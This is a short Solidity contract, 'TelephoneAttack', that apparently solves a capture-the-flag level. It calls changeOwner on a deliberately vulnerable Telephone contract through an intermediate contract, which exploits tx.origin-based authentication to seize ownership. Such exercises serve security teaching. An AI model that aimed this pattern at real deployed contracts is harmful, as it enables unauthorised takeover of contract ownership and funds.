// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TelephoneAttack {
    Telephone public immutable i_telephone;

    constructor(address vulnerableContractAddress) {
        i_telephone = Telephone(vulnerableContractAddress);
    }

    function initiateAttack(address _owner) public {
        i_telephone.changeOwner(_owner);
    }
}
